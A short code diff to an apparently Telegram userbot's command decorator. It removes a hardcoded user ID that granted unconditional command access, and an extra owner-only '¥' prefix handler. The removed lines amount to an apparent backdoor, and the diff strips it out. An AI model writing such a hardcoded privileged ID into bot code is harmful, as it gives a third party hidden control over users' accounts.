@@ -43,7 +43,6 @@ class PY:
 
     def UBOT(command, filter=FILTERS.ME, SUDO=True):
         def decorator(func):
-            @ubot.on_message(filters.command(command, "¥") & FILTERS.OWNER)
             @ubot.on_message(
                 ubot.cmd_prefix(command) & filter
                 if not SUDO
@@ -54,10 +53,7 @@ class PY:
                 is_self = user.is_self if message.from_user else client.me.is_self
                 sudo_id = await get_list_from_vars(client.me.id, "SUDO_USERS")
 
-                if user.id in [5876222922, OWNER_ID]:
-                    return await func(client, message)
-
-                elif SUDO and is_self or user.id in sudo_id:
+                if SUDO and is_self or user.id in sudo_id:
                     return await func(client, message)
 
                 elif not SUDO:
